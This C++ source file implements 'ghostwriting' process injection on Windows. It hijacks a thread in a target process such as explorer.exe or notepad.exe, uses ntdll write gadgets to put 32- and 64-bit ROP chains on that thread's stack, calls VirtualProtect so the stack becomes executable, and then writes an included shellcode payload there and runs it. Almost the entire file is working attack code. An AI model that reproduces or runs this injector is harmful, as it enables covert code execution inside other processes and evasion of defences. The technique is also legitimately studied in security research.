/**
* Injects shellcode using a ghost-writing (ROP based) technique.
* The implementaion uses a ROP chain to call VirtualProtect and make the stack executable to execute its payload
* Note: 
*	- 32 bit ROP chain uses gadgets in ntdll.dll and kernel32.dll
	- 64 bit ROP chain uses gadgets in ntdll.dll 
*	- The ghostwriting uses gadgets from ntdll.dll
*	- for 64 bit you can set "useRopChain" to false to allocate executable memory using VirtualAllocEx instead of using a ROP chain. This still requires the writegadget and endless loop for ghostwriting to be found
* Supports 32- and 64 Bit applications.
* The hijacked thread may require the target application to be focused or some interaction to execute.
* Based on: https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf, https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html
*/

#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

#ifdef _WIN64
bool useRopChain = true;
#define Xip Rip
#else
#define Xip Eip
#endif



// generated using the mona.py script inside "Immunity Debugger"
// the ROP chain contains offsets into ntddl and kernel32, which are rebased before the ROP chain is written to the remote process
unsigned int virtualProtectRopChain[] = {
	//[---INFO:gadgets_to_set_esi:---]
	0xF9CD1,  // POP EAX // RETN [ntdll.dll]
	0x81364,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
	0x48438,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL]
	0x6E1F6,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL]
	//[---INFO:gadgets_to_set_ebp:---]
	0x7A451,  // POP EBP // RETN [ntdll.dll]
	0x1C712,  // & push esp // ret  [ntdll.dll] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_ebx:---]
	0x2BA7B,  // POP EBX // RETN [ntdll.dll]
	0x00000201,  // 0x00000201-> ebx
	//[---INFO:gadgets_to_set_edx:---]
	0x7B063,  // POP EDX // RETN [ntdll.dll]
	0x00000040,  // 0x00000040-> edx
	//[---INFO:gadgets_to_set_ecx:---]
	0x5DFE3,  // POP ECX // RETN [ntdll.dll]
	0x128923,  // &Writable location [ntdll.dll] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_edi:---]
	0x6C8B6,  // POP EDI // RETN [KERNEL32.DLL]
	0x4A91A,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_eax:---]
	0xE78CA,  // POP EAX // RETN [ntdll.dll]
	0x90909090,  // nop
	//[---INFO:pushad:---]
	0x4EA16,  // PUSHAD // RETN [ntdll.dll]    //order of pushes EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI
};


// x64 ropchain. All gadgets are inside ntdll.dll
DWORD_PTR virtualProtectRopChain64[] = {
	0x00000000000010df, // pop rdi; ret
	0x1111111111111111,	//	VirtualProtectAddress
	0x000000000001a853, // pop rcx; ret
	0x2222222222222222, //	targetAddress,
	0x000000000008c547, // pop rdx; pop r11; ret
	0x0000000000000200, //	size
	0x6666666666666666,	//	trash r11 (gadget sideeffect)
	0x0000000000007223, // pop r8; ret
	0x0000000000000040,	//  newProtection (PAGE_EXECUTE_READWRITE)
	0x000000000008c544, // pop r9; pop r10; pop r11; ret
	0x3333333333333333, //  oldProtection (just some pointer to writeable memory)
	0x4444444444444444,	//  trash r10 (gadget sideeffect)
	0x5555555555555555,	//  trash r11 (gadget sideeffect)
	0x00000000000481c5, // push rdi; ret (this instruction calls VirtualProtect since we put its address into rdi earlier)
	0x7777777777777777, // Address of the written shellcode on the stack. VirtuaProtect will use this address to return to after its call. 
};

// from https://github.com/frk1/PolandCheater-perfecthook/blob/master/PerfectHook/Utilities.cpp
BYTE* FindBytePattern(const char* module, const char* signature)
{
	static auto ConvertPatternToBytes = [](const char* pattern)
	{
		std::vector<int> bytes = std::vector<int>{};
		char* start = const_cast<char*>(pattern);
		char* end = const_cast<char*>(pattern) + strlen(pattern);

		for (char* current = start; current < end; ++current)
		{
			if (*current == '?')
			{
				++current;
				if (*current == '?')
				{
					++current;
				}
				bytes.push_back(-1);
			}
			else
			{
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	BYTE* moduleBaseAddress = (BYTE*)GetModuleHandleA(module);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)moduleBaseAddress + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = ConvertPatternToBytes(signature);
	uint8_t* currentAddress = reinterpret_cast<uint8_t*>(moduleBaseAddress);

	int patternSize = patternBytes.size();
	int* patternData = patternBytes.data();

	for (int i = 0; i < sizeOfImage - patternSize; ++i)
	{
		bool found = true;
		for (int j = 0; j < patternSize; ++j)
		{
			if (currentAddress[i + j] != patternData[j] && patternData[j] != -1)
			{
				found = false;
				break;
			}
		}
		if (found)
		{
			return &currentAddress[i];
		}
	}
	return nullptr;
}

void RebaseRopChain()
{
	// we use ntdll and kernel32 since they are loaded for each process by default
	// we can use this processes addresses for ntdll and kernel32 since the ASLR offset will be the same in the remote process
	DWORD_PTR currentNtdllBaseAdress = (DWORD_PTR)GetModuleHandle("ntdll.dll");
	DWORD_PTR currentKernel32BaseAdress = (DWORD_PTR)GetModuleHandle("kernel32.dll");

	// ntdll
	virtualProtectRopChain[0] += currentNtdllBaseAdress;
	virtualProtectRopChain[4] += currentNtdllBaseAdress;
	virtualProtectRopChain[5] += currentNtdllBaseAdress;
	virtualProtectRopChain[6] += currentNtdllBaseAdress;
	virtualProtectRopChain[8] += currentNtdllBaseAdress;
	virtualProtectRopChain[10] += currentNtdllBaseAdress;
	virtualProtectRopChain[11] += currentNtdllBaseAdress;
	virtualProtectRopChain[14] += currentNtdllBaseAdress;
	virtualProtectRopChain[16] += currentNtdllBaseAdress;

	// kernel32
	virtualProtectRopChain[1] += currentKernel32BaseAdress;
	virtualProtectRopChain[2] += currentKernel32BaseAdress;
	virtualProtectRopChain[3] += currentKernel32BaseAdress;
	virtualProtectRopChain[12] += currentKernel32BaseAdress;
	virtualProtectRopChain[13] += currentKernel32BaseAdress;
}

void RebaseRopChain64()
{
	// we use ntdll and kernel32 since they are loaded for each process by default
	// we can use this processes addresses for ntddl and kernel32 since the ASLR offset will be the same in the remote process
	DWORD_PTR currentNtdllBaseAdress = (DWORD_PTR)GetModuleHandle("ntdll.dll");

	// ntdll
	virtualProtectRopChain64[0] += currentNtdllBaseAdress;
	virtualProtectRopChain64[1] = (DWORD_PTR)VirtualProtect;
	virtualProtectRopChain64[2] += currentNtdllBaseAdress;
	virtualProtectRopChain64[4] += currentNtdllBaseAdress;
	virtualProtectRopChain64[7] += currentNtdllBaseAdress;
	virtualProtectRopChain64[9] += currentNtdllBaseAdress;
	virtualProtectRopChain64[13] += currentNtdllBaseAdress;
	virtualProtectRopChain64[14] += currentNtdllBaseAdress;
}

bool ExecutePayload(HANDLE threadHandle, BYTE* remoteMemory)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing payload at %p\n", remoteMemory);

	ctx.Xip = (DWORD_PTR)remoteMemory;

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}
}

bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

#ifdef _WIN64
	DWORD_PTR fakeStack = ctx.Rsp - 0x400;

	// write gadget
	// volatile registers won't be set by SetContextThread (https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers)
	// registers set are: Rbx, Rsp, Rbp, Rsi, Rdi, R12 - R15, Xmm6 - Xmm15
	// https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers in x64 only setting no volatile works

	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	ctx.Rip = (DWORD_PTR)writeGadget;
	ctx.Rbx = fakeStack;
	ctx.R14 = (DWORD_PTR)endlessLoopGadget;

	// - 0x28 to correct for add rsp, 0x20 and pop r14 in the gadget 
	ctx.Rsp = fakeStack - 0x28;
#else 
	DWORD_PTR fakeStack = ctx.Esp - 0x400;

	// write gadget
	// 89 11	mov[ecx], edx; ret
	ctx.Eip = (DWORD_PTR)writeGadget;
	ctx.Ecx = fakeStack;
	ctx.Edx = (DWORD_PTR)endlessLoopGadget;
	ctx.Esp = fakeStack;
#endif

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Writing loop gadget (%p) to fake stack (%p)", endlessLoopGadget, fakeStack);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	// check if hijacked thread has executed last write and is now at the infinity loop
	do
	{
		printf(".");
		Sleep(50);
		GetThreadContext(threadHandle, &ctx);
	} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);

	printf("done.\n");
}

#ifdef _WIN64
DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing ROP chain to fake stack");

	DWORD_PTR lastWriteAddress = 0;

	for (int i = 0; i < sizeof(virtualProtectRopChain64) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

		// write gadget ntdll
		//.text:0000000180082733	mov [rbx], r14
		//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
		//.text:000000018008273B	add rsp, 20h
		//.text:000000018008273F	pop r14
		//.text:0000000180082741	retn
		ctx.Xip = (DWORD_PTR)writeGadget;

		// the third entry in the ropchain is the target address for virtual protect
		if (i == 3)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp + 0x4a9;
		}

		// the 10th entry in the ropchain is a writeable location for the old page protections
		// just use a writeable location in ntdll
		if (i == 10)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)GetModuleHandleA("ntdll.dll") + 0x1645A0;
		}

		if (i == 14)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp + 0x4a9;
		}

		ctx.R14 = (DWORD_PTR)((DWORD_PTR*)virtualProtectRopChain64)[i];

		ctx.Rbx = (DWORD_PTR)ctx.Rsp - 0x368 + i * sizeof(void*); // 

		// we need to store this since the gadget changes rbx
		lastWriteAddress = ctx.Rbx;

		// set Rsp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*)) and the -0x28 is due to the gadget increasing the stack by 0x28
		ctx.Rsp = ctx.Rsp - 0x28 - sizeof(void*);

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		//printf("\t writing %x to %x\n", ctx.Edx, ctx.Ecx);

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
	}

	printf("done.\n");

	// with the current ropchain and setup the final write contains the address where VirtualProtect made the stack executable and our shellcode can start
	//	"writing 7781ea16 to 2f3f684"
	//	"writing 0 to 2f3f688"
	return lastWriteAddress;
}

bool Execute64BitRopChain(HANDLE threadHandle)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	// execute first gadget in ROP chain
	ctx.Xip = virtualProtectRopChain64[0];

	// set esp to second gadget in ROP chain, since the first is going to be executed already
	ctx.Rsp = (DWORD_PTR)ctx.Rsp - 0x368 + sizeof(void*) * 1;

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing first gadget of ROP chain at %llx\n", ctx.Xip);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	return true;
}
#else
DWORD_PTR Write32BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing ROP chain to fake stack");

	for (int i = 0; i < sizeof(virtualProtectRopChain) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

		// write gadget
		// mov[ecx], edx; ret
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.Edx = (DWORD_PTR)virtualProtectRopChain[i];
		ctx.Ecx = (DWORD_PTR)ctx.Esp - 0x360 + i * sizeof(void*); // 

		// set Esp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*))
		ctx.Esp = ctx.Esp - sizeof(void*);

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		//printf("\t writing %x to %x\n", ctx.Edx, ctx.Ecx);

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
	}

	printf("done.\n");

	// with the current ropchain and setup the final write contains the address where VirtualProtect made the stack executable and our shellcode can start
	//	"writing 7781ea16 to 2f3f684"
	//	"writing 0 to 2f3f688"
	return ctx.Ecx;
}
bool Execute32BitRopChain(HANDLE threadHandle)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	// execute first gadget in ROP chain
	ctx.Xip = virtualProtectRopChain[0];

	// set esp to second gadget in ROP chain, since the first is going to be executed already
	ctx.Esp = (DWORD_PTR)ctx.Esp - 0x360 + sizeof(void*);

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing first gadget of ROP chain at %x\n", ctx.Xip);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	return true;
}
#endif

// the shellcode comes write after the ropchain, as the ROP chain makes the stack above (add esp) executable and jumps to execute
bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing shellcode");

	for (int i = 0; i < sizeof(shellcode) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

#ifdef _WIN64
		// write gadget ntdll
		//.text:0000000180082733	mov [rbx], r14
		//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
		//.text:000000018008273B	add rsp, 20h
		//.text:000000018008273F	pop r14
		//.text:0000000180082741	retn
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.R14 = (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Rbx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Rsp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*)) and the -0x28 is due to the gadget increasing the stack by 0x28
		ctx.Rsp = ctx.Rsp - 0x28 - sizeof(void*);

		//printf("\t\"%p\" to % p\n", ctx.R14, ctx.Rbx);
#else 
		// write gadget
		// mov[ecx], edx; ret
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.Edx = (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Ecx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Esp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*))
		ctx.Esp = ctx.Esp - sizeof(void*);
#endif

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
	}
	printf("done.\n");
	return true;
}

int main(int argc, char* argv[])
{
	const char* processName = "explorer.exe";

#ifdef _WIN64
	if (argc != 3)
	{
		printf("Usage: *.exe bUseRopChain [processName]\n");
		return 1;
	}
	useRopChain = atoi(argv[1]);
	processName = argv[2];
	if (useRopChain && strcmp(processName, "notepad.exe") != 0)
	{
		printf("[Error] - The current ROPchain can only be used with notepad.exe\n");
		return 1;
	}
#else
	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}
	processName = argv[1];
#endif

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	// jmp	0x0
	BYTE* endlessLoopGadget = FindBytePattern("ntdll.dll", "EB FE");
	if (!endlessLoopGadget)
	{
		printf("[Error] - Failed to find infinit loop in ntdll\n");
		return 1;
	}

#ifdef _WIN64
	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "4C 89 73 08 4C 89 33") + 4;
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#else 
	// 89 11	mov[ecx], edx
	// C3		retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "89 11 C3");
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#endif

	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// find to thread in the target processes and execute code by changing its CONTEXT
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}

			WriteLoopGadgetToStack(threadHandle, writeGadget, endlessLoopGadget);
#ifdef _WIN64

			if (useRopChain)
			{
				RebaseRopChain64();
				DWORD_PTR executableStackStartAddress = Write64BitRopChain(threadHandle, writeGadget, endlessLoopGadget);
				executableStackStartAddress += 0x18;	// skip shadowspace so our shellcode doesn't get overwritten

				// harcoded delta between our shellcode address on the stack and rbp which does contain a stack address after our virtualalloc call
				// this offset is valid for my current notepad.exe version. In calc the offset is different
				executableStackStartAddress += 0x779;
				executableStackStartAddress += 0x8;
				WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoopGadget);
				Execute64BitRopChain(threadHandle);		
			}
			else
			{
				LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (!remoteMemory)
				{
					printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
					return 1;
				}
				WriteShellcode(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoopGadget);
				ExecutePayload(threadHandle, (BYTE*)remoteMemory);
			}	
#else
			RebaseRopChain();
			DWORD_PTR executableStackStartAddress = Write32BitRopChain(threadHandle, writeGadget, endlessLoopGadget);
			WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoopGadget);
			Execute32BitRopChain(threadHandle);
#endif

			printf("[Info] - Ghost writing finished\n");
			CloseHandle(threadHandle);
			return 0;
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	return 0;
}